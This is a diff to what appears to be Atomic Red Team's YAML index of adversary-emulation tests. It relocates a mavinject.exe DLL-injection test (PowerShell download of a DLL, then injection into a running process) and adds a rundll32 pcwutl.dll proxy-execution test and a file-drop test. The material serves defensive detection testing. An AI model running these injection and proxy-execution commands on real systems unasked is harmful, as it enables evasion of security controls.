@@ -2672,7 +2672,43 @@ privilege-escalation:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1055.001
+    atomic_tests:
+    - name: Process Injection via mavinject.exe
+      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
+      description: |
+        Windows 10 Utility To Inject DLLS.
+
+        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
+      supported_platforms:
+      - windows
+      input_arguments:
+        process_id:
+          description: PID of input_arguments
+          type: Integer
+          default: "(Start-Process notepad -PassThru).id"
+        dll_payload:
+          description: DLL to Inject
+          type: Path
+          default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
+      executor:
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
+        name: powershell
+        elevation_required: true
   T1548.004:
     technique:
       external_references:
@@ -5901,41 +5937,6 @@ privilege-escalation:
       x_mitre_is_subtechnique: false
       identifier: T1055
     atomic_tests:
-    - name: Process Injection via mavinject.exe
-      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
-      description: |
-        Windows 10 Utility To Inject DLLS.
-
-        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
-        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
-      supported_platforms:
-      - windows
-      input_arguments:
-        process_id:
-          description: PID of input_arguments
-          type: Integer
-          default: "(Start-Process notepad -PassThru).id"
-        dll_payload:
-          description: DLL to Inject
-          type: Path
-          default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
-
-'
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
-      executor:
-        command: |
-          $mypid = #{process_id}
-          mavinject $mypid /INJECTRUNNING #{dll_payload}
-        name: powershell
-        elevation_required: true
     - name: Shellcode execution via VBA
       auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
       description: |
@@ -30160,7 +30161,43 @@ defense-evasion:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1055.001
+    atomic_tests:
+    - name: Process Injection via mavinject.exe
+      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
+      description: |
+        Windows 10 Utility To Inject DLLS.
+
+        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
+      supported_platforms:
+      - windows
+      input_arguments:
+        process_id:
+          description: PID of input_arguments
+          type: Integer
+          default: "(Start-Process notepad -PassThru).id"
+        dll_payload:
+          description: DLL to Inject
+          type: Path
+          default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
+      executor:
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
+        name: powershell
+        elevation_required: true
   T1548.004:
     technique:
       external_references:
@@ -37252,41 +37289,6 @@ defense-evasion:
       x_mitre_is_subtechnique: false
       identifier: T1055
     atomic_tests:
-    - name: Process Injection via mavinject.exe
-      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
-      description: |
-        Windows 10 Utility To Inject DLLS.
-
-        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
-        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
-      supported_platforms:
-      - windows
-      input_arguments:
-        process_id:
-          description: PID of input_arguments
-          type: Integer
-          default: "(Start-Process notepad -PassThru).id"
-        dll_payload:
-          description: DLL to Inject
-          type: Path
-          default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
-
-'
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
-      executor:
-        command: |
-          $mypid = #{process_id}
-          mavinject $mypid /INJECTRUNNING #{dll_payload}
-        name: powershell
-        elevation_required: true
     - name: Shellcode execution via VBA
       auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
       description: |
@@ -39099,6 +39101,24 @@ defense-evasion:
         command: |
           rundll32.exe url.dll,OpenURL PathToAtomicsFolder\T1218.011\src\index.hta
           rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\T1218.011\src\akteullen.vbs
+        name: command_prompt
+    - name: Launches an executable using Rundll32 and pcwutl.dll
+      auto_generated_guid: 9f5d081a-ee5a-42f9-a04e-b7bdc487e676
+      description: 'Executes the LaunchApplication function in pcwutl.dll to proxy
+        execution of an executable.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_to_launch:
+          description: Path of the executable to launch
+          type: path
+          default: "%windir%\\System32\\notepad.exe"
+      executor:
+        command: 'rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
+
+'
         name: command_prompt
   T1134.005:
     technique:
@@ -55503,6 +55523,31 @@ execution:
 
 '
         name: powershell
+    - name: Writes text to a file and displays it.
+      auto_generated_guid: 127b4afe-2346-4192-815c-69042bec570e
+      description: 'Writes text to a file and display the results. This test is intended
+        to emulate the dropping of a malicious file to disk.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_contents_path:
+          description: Path to the file that the command prompt will drop.
+          type: path
+          default: "%TEMP%\\test.bin"
+        message:
+          description: Message that will be written to disk and then displayed.
+          type: string
+          default: Hello from the Windows Command Prompt!
+      executor:
+        command: 'echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"
+
+'
+        cleanup_command: 'del "#{file_contents_path}"
+
+'
+        name: command_prompt
   T1047:
     technique:
       id: attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055
